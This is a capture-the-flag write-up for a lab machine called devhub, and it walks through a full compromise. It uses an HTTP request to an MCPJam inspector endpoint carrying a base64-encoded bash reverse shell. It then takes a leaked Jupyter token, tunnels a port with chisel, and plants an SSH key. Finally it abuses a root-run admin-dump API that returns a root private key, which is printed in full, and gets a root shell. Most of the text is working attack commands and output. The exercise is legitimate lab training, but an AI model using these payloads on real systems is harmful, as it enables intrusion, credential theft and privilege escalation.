#### port scan
```
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
6274/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 200 OK
|     access-control-allow-credentials: true
|     content-length: 466
|     content-type: text/html; charset=utf-8
|     vary: Origin
|     Date: Sun, 31 May 2026 03:25:46 GMT
|     Connection: close
|     <!doctype html>
```
port 6274 is running mcpjam inspector, searching for the vuln of mcpjam.

https://github.com/iamrajkumar1995/MCPJam-Exploit/blob/master/mcpexploit1.py

or use burp S to interact with /api/mcp/connect to get a reverse shell.
```
POST /api/mcp/connect HTTP/1.1
Host: devhub.htb:6274
content-type: application/json
Content-Length: 217

{
		"serverConfig": {
    "command": "/bin/bash",
    "args": [		      					   "-c","echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41MS84ODIxIDA+JjEK | base64 -d | bash"],
    "env": {}
  },

  "serverId": "test"}
```

`└─$ nc -nvlp 8821 `    
```
listening on [any] 8821 ...
connect to [10.10.16.51] from (UNKNOWN) [10.129.182.7] 43994
bash: cannot set terminal process group (1090): Inappropriate ioctl for device
bash: no job control in this shell
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ id
id
uid=1001(mcp-dev) gid=1001(mcp-dev) groups=1001(mcp-dev)
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$
```
run linpeas,we can see jupyter is running on port 8888:
```
analyst     1088  0.0  2.4 182536 96644 ?        Ss   12:07   0:06 
/home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
```

`curl http://127.0.0.1:8888/lab?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7`
```
</lab?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7       
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0<!doctype html><html lang="en"><head><meta charset="utf-8"><title>JupyterLab</title><meta name="viewport" content="width=device-width,initial-scale=1">   <script id="jupyter-config-data" type="application/json">{"allow_hidden_files": false, "appName": "JupyterLab", "appNamespace": "lab", "appSettingsDir": "/home/analyst/jupyter-env/share/jupyter/lab/settings", "appUrl": "/lab", "appVersion": "4.5.2", "baseUrl": "/", "buildAvailable": true, "buildCheck": true, "cacheFiles": false, "copyAbsolutePath": false, "delete_to_trash": true, "devMode": false, "disabledExtensions": [], "exposeAppInBrowser": false, "extensionManager": {"can_install": true, "install_path": "/home/analyst/jupyter-env", "name": "PyPI"}, "extraLabextensionsPath": [], "federated_extensions": [{"entrypoints": null, "extension": "./extension", "load": "static/remoteEntry.5cbb9d2323598fbda535.js", "name": "jupyterlab_pygments", "style": "./style"}, {"entrypoints": null, "extension": "./extension", "load": "static/remoteEntry.fc1011a4f389fd607c52.js", "name": "@jupyter-notebook/lab-extension", "style": "./style"}, {"entrypoints": null, "extension": "./extension", "load": "static/remoteEntry.9077b3d2deaffb329dfc.js", "name": "@jupyter-widgets/jupyterlab-manager"}], "fullAppUrl": "/lab", "fullLabextensionsUrl": "/lab/extensions", "fullLicensesUrl": "/lab/api/licenses", "fullListingsUrl": "/lab/api/listings", "fullMathjaxUrl": "https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/MathJax.js", "fullSettingsUrl": "/lab/api/settings", "fullStaticUrl": "/static/lab", "fullThemesUrl": "/lab/api/themes", "fullTranslationsApiUrl": "/lab/api/translations", "fullTreeUrl": "/lab/tree", "fullWorkspacesApiUrl": "/lab/api/workspaces", "ignorePlugins": [], "labextensionsPath": ["/home/analyst/jupyter-env/share/jupyter/labextensions", "/home/analyst/.local/share/jupyter/labextensions", "/usr/local/share/jupyter/labextensions", "/usr/share/jupyter/labextensions"], "labextensionsUrl": "/lab/extensions", "licensesUrl": "/lab/api/licenses", "listingsUrl": "/lab/api/listings", "mathjaxConfig": "TeX-AMS_HTML-full,Safe", "mode": "multiple-document", "nbclassic_enabled": false, "news": {"disabled": false}, "notebookStartsKernel": true, "notebookVersion": "[2, 17, 0]", "preferredPath": "/", "quitButton": true, "rootUri": "file:///home/analyst/notebooks", "schemasDir": "/home/analyst/jupyter-env/share/jupyter/lab/schemas", "serverRoot": "~/notebooks", "settingsUrl": "/lab/api/settings", "staticDir": "/home/analyst/jupyter-env/share/jupyter/lab/static", "store_id": 0, "templatesDir": "/home/analyst/jupyter-env/share/jupyter/lab/static", "terminalsAvailable": true, "themesDir": "/home/analyst/jupyter-env/share/jupyter/lab/themes", "themesUrl": "/lab/api/themes", "token": "a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7", "translationsApiUrl": "/lab/api/translations", "treePath": "", "treeUrl": "/lab/tree", "untracked_message_types": ["comm_info_request", "comm_info_reply", "kernel_info_request", "kernel_info_reply", "shutdown_request", "shutdown_reply", "interrupt_request", "interrupt_reply", "debug_request", "debug_reply", "stream", "display_data", "update_display_data", "execute_input", "execute_result", "error", "status", "clear_output", "debug_event", "input_request", "input_reply"], "userSettingsDir": "/home/analyst/.jupyter/lab/user-settings", "virtualDocumentsUri": "file:///home/analyst/notebooks/.virtual_documents", "workspace": "default", "workspacesApiUrl": "/lab/api/workspaces", "workspacesDir": "/home/analyst/.jupyter/lab/workspaces", "wsUrl": ""}</script><link rel="icon" type="image/x-icon" href="/static/favicons/favicon.ico" class="idle favicon"><link rel="" type="image/x-icon" href="/static/favicons/favicon-busy-1.ico" class="busy favicon"> <script defer="defer" src="/static/lab/main.8b2c3d9cdc9b5f4bb9a6.js?v=8b2c3d9cdc9b5f4bb9a6"></script></head><body class="jp-ThemedContainer"><script>/* Remove token from URL. */
  (function () {
    var location = window.location;
    var search = location.search;

    // If there is no query string, bail.
    if (search.length <= 1) {
100  4592  100  4592    0     0   229k      0 --:--:-- --:--:-- --:--:--  249k
turn;
    }

    // Rebuild the query string without the `token`.
    var query = '?' + search.slice(1).split('&')
      .filter(function (param) { return param.split('=')[0] !== 'token'; })
      .join('&');

    // Rebuild the URL with the new query string.
    var url = location.origin + location.pathname +
      (query !== '?' ? query : '') + location.hash;

    if (url === location.href) {
      return;
    }

    window.history.replaceState({ }, '', url);
  })();</script></body></html>
```
forward this port to kali using chisel
```
mcp-dev@devhub:/tmp$ chmod +x chisel
chmod +x chisel
mcp-dev@devhub:/tmp$ ./chisel client 10.10.16.51:8831 R:8888:localhost:8888 
./chisel client 10.10.16.51:8831 R:8888:localhost:8888 
2026/05/31 15:46:08 client: Connecting to ws://10.10.16.51:8831
2026/05/31 15:46:10 client: Connected (Latency 177.145668ms)
2026/05/31 15:59:32 client: Disconnected
```
```
└─$ ./chisel server --port 8831 --reverse
2026/05/31 11:59:39 server: Reverse tunnelling enabled
2026/05/31 11:59:39 server: Fingerprint R4/TnoOSmOOb9UBxYUiACI6+KqgLuxPs7DEpxv12ieo=
2026/05/31 11:59:39 server: Listening on http://0.0.0.0:8831
2026/05/31 11:59:47 server: session#1: tun: proxy#R:8888=>localhost:8888: Listening
```
we can access jupyter on kali broswer, wait for jupyter to connect to python kernel. then use terminal to interact with OS as user anlyst. we put a ssh private key to analyst .ssh/authorized_keys then ssh -i as anlyst

here we have the mcp key.
`analyst@devhub:~$ cat .opsmcp_key`
```
opsmcp_secret_key_4f5a6b7c8d9e0f1a
```
and we can see mcp server ran by root.
```
root        1096  0.0  0.7 111108 28748 ?        Ss   12:07   0:04 /home/manalyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```
`cat /opt/opsmcp/server.py`
```
def check_auth():
    """Check API key authentication"""
    api_key = request.headers.get('X-API-Key', '')
    return api_key == VALID_API_KEY

elif tool_name == "ops._admin_dump":
        target = args.get('target', '')
        confirm = args.get('confirm', False)
        
        if not confirm:
            return jsonify({
                "error": "Confirmation required",
                "usage": "Set confirm=true to proceed",
                "warning": "This dumps sensitive credentials"
            })
        
        if target == "ssh_keys":
            try:
                with open('/root/.ssh/id_rsa', 'r') as f:
                    key_data = f.read()
                return jsonify({
                    "target": "ssh_keys",
                    "root_private_key": key_data,
                    "note": "Emergency recovery key dump"
                })
        elif target == "passwords":
            return jsonify({
                "target": "passwords",
                "dump": {
                    "root": "$6$rounds=656000$saltsalt$hashedpassword",
                    "analyst": "JupyterN0tebook!2026",
                    "mcp-dev": "Mcp!Insp3ct0r2026"
                }
            })
```
try to connect tool API
`analyst@devhub:~/jupyter-env/bin$ curl -H "X-API-Key:opsmcp_secret_key_4f5a6b7c8d9e0f1a" -X POST http://127.0.0.1:5000/tools/call`
```
<!doctype html>
<html lang=en>
<title>415 Unsupported Media Type</title>
<h1>Unsupported Media Type</h1>
<p>Did not attempt to load JSON data because the request Content-Type was not &#39;application/json&#39;.</p>
```
so can interact with it and post some fields required from the server.py file.

`curl -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" -H "Content-Type: application/json" -X POST http://127.0.0.1:5000/tools/call -d '{"name": "ops._admin_dump", "arguments":{"target":"ssh_keys", "confirm": "true"}}'`
```
{"note":"Emergency recovery key dump","root_private_key":"-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9\nG/jqltqP312IONAX9LwvTne81E4h+hi2xdjwgvh27iE4AvCQolR8S0GWHwHQjjXVQ5/dHX\n8MA96Qabow623zQe5D6PUAsFj6aWP5fDceIziAxkLIMgpsE6I0bWOKaGmgEG0rW1I/mw8z\n6HmooVORQsQoTaVUhnUmRJRcLpQEu94hzb+0kQ0ObKikcDTnit1kQ/7ZUOoyGhUgEwVk/n\nGhm2D96OW/JLpMIowwDxnka+3l9u5Aj55Y9fWN9aGld5pVvcoPRZ7twODIbXNSjzWsLQRQ\n7l8/a2M+aQAAA8BGnYWeRp2FngAAAAdzc2gtcnNhAAABAQDBYfDgi/zIPDKo5pw7m4HY4W\nv9FoPVMXX3am2Ale7S+PlJPKk5Qf0b+OqW2o/fXYg40Bf0vC9Od7zUTiH6GLbF2PCC+Hbu\nITgC8JCiVHxLQZYfAdCONdVDn90dfwwD3pBpujDrbfNB7kPo9QCwWPppY/l8Nx4jOIDGQs\ngyCmwTojRtY4poaaAQbStbUj+bDzPoeaihU5FCxChNpVSGdSZElFwulAS73iHNv7SRDQ5s\nqKRwNOeK3WRD/tlQ6jIaFSATBWT+caGbYP3o5b8kukwijDAPGeRr7eX27kCPnlj19Y31oa\nV3mlW9yg9Fnu3A4Mhtc1KPNawtBFDuXz9rYz5pAAAAAwEAAQAAAQAjgZkZkXpjRXJDwrvS\n0fWgXZtXR8gC3+b5+4eJgX3tLJuQz9t+UNhpR2XDNvQNnf3B+Ks9W0QQUznPfV0Nr3X3k6\nJtWbN0e5LuLz9PHtYHd05Z+RpS0h2LIhIWNVp+Z2H6l54dy/1LELVVU47B0kSAD0Qig3g8\nHUa/oEljrrgzTlYflRHhkHQblmd9ZaClUoxIDh0zf2Esmp3nIRBm4J1OX5UQPiPEa7/LkB\ndcQr1K4Z1pbZglc5wPUJZCv8MtVPvW9rCgERl9Sl4bKevsgS4mMMUvVxNdqyasYqNAXi/L\nCvk9YYP9PS4q1dfCYMIvsJJNyoBtUiCJwqW2ba6hs1vVAAAAgDEPkj6UOdX1B872cHrja2\nnkahzlja7GZw3G2+hsib4kH/G1nwQs9RRtnzqf/mrXeEhxB27ZN+QE39e7yTC3r6f84mSn\nMz/gS3Czh6DtP+S18jV4xCeac/SoLuxgLvPZ3xnHWvPO6HePQzyVlVk/MBfp+yPrCpIiHK\nMtVMaeJXFYAAAAgQDSlTQAPhkFhsswOcohRO+1hd/4xdD9UECem1ytsb5/on47/GEWvtQI\noocmAAMvEYlOvs8GXeYkMBAwi5VCjLunNBCmuRMjTEgE7lqgdhfkK0Lx/a4BWnYaki+xbk\nJt9XB5f2NlmnT4A5QqiO+qPYA2i1iF9CSv5ypxqHFChgMZNwAAAIEA6xcR6lBjwgtKuzRQ\nnI+f8DFRxcdfKY1gs0BmfS0RRxwDzIEwJHYafyHnq/CKBTDPCYyn/VI+mF64hhtjUbDgAr\nC8X6q/4LJecp3piSHgv6yXhpzkxtz+Q/JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK\nlFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=\n-----END OPENSSH PRIVATE KEY-----\n","target":"ssh_keys"}
```
we get a private key, might belonged to root.

`└─$ echo "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9\nG/jqltqP312IONAX9LwvTne81E4h+hi2xdjwgvh27iE4AvCQolR8S0GWHwHQjjXVQ5/dHX\n8MA96Qabow623zQe5D6PUAsFj6aWP5fDceIziAxkLIMgpsE6I0bWOKaGmgEG0rW1I/mw8z\n6HmooVORQsQoTaVUhnUmRJRcLpQEu94hzb+0kQ0ObKikcDTnit1kQ/7ZUOoyGhUgEwVk/n\nGhm2D96OW/JLpMIowwDxnka+3l9u5Aj55Y9fWN9aGld5pVvcoPRZ7twODIbXNSjzWsLQRQ\n7l8/a2M+aQAAA8BGnYWeRp2FngAAAAdzc2gtcnNhAAABAQDBYfDgi/zIPDKo5pw7m4HY4W\nv9FoPVMXX3am2Ale7S+PlJPKk5Qf0b+OqW2o/fXYg40Bf0vC9Od7zUTiH6GLbF2PCC+Hbu\nITgC8JCiVHxLQZYfAdCONdVDn90dfwwD3pBpujDrbfNB7kPo9QCwWPppY/l8Nx4jOIDGQs\ngyCmwTojRtY4poaaAQbStbUj+bDzPoeaihU5FCxChNpVSGdSZElFwulAS73iHNv7SRDQ5s\nqKRwNOeK3WRD/tlQ6jIaFSATBWT+caGbYP3o5b8kukwijDAPGeRr7eX27kCPnlj19Y31oa\nV3mlW9yg9Fnu3A4Mhtc1KPNawtBFDuXz9rYz5pAAAAAwEAAQAAAQAjgZkZkXpjRXJDwrvS\n0fWgXZtXR8gC3+b5+4eJgX3tLJuQz9t+UNhpR2XDNvQNnf3B+Ks9W0QQUznPfV0Nr3X3k6\nJtWbN0e5LuLz9PHtYHd05Z+RpS0h2LIhIWNVp+Z2H6l54dy/1LELVVU47B0kSAD0Qig3g8\nHUa/oEljrrgzTlYflRHhkHQblmd9ZaClUoxIDh0zf2Esmp3nIRBm4J1OX5UQPiPEa7/LkB\ndcQr1K4Z1pbZglc5wPUJZCv8MtVPvW9rCgERl9Sl4bKevsgS4mMMUvVxNdqyasYqNAXi/L\nCvk9YYP9PS4q1dfCYMIvsJJNyoBtUiCJwqW2ba6hs1vVAAAAgDEPkj6UOdX1B872cHrja2\nnkahzlja7GZw3G2+hsib4kH/G1nwQs9RRtnzqf/mrXeEhxB27ZN+QE39e7yTC3r6f84mSn\nMz/gS3Czh6DtP+S18jV4xCeac/SoLuxgLvPZ3xnHWvPO6HePQzyVlVk/MBfp+yPrCpIiHK\nMtVMaeJXFYAAAAgQDSlTQAPhkFhsswOcohRO+1hd/4xdD9UECem1ytsb5/on47/GEWvtQI\noocmAAMvEYlOvs8GXeYkMBAwi5VCjLunNBCmuRMjTEgE7lqgdhfkK0Lx/a4BWnYaki+xbk\nJt9XB5f2NlmnT4A5QqiO+qPYA2i1iF9CSv5ypxqHFChgMZNwAAAIEA6xcR6lBjwgtKuzRQ\nnI+f8DFRxcdfKY1gs0BmfS0RRxwDzIEwJHYafyHnq/CKBTDPCYyn/VI+mF64hhtjUbDgAr\nC8X6q/4LJecp3piSHgv6yXhpzkxtz+Q/JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK\nlFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=\n-----END OPENSSH PRIVATE KEY-----" > key`

`└─$ chmod 400 key   `
                                                                                                    
`└─$ ssh -i key root@10.129.182.7 `
```
root@devhub:~# id
uid=0(root) gid=0(root) groups=0(root)
```

#### lesson learned
- use curl to interact with applicaiton -H to add header and -d to set body.
